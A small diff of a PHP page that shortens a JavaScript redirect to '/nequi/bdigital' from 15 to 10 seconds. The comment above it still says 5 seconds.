@@ -52,7 +52,7 @@ if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){
     // Redirigir a otra página después de 5 segundos
 setTimeout(function() {
   window.location.href = "/nequi/bdigital";
-}, 15000);
+}, 10000);
 
 </script>
 
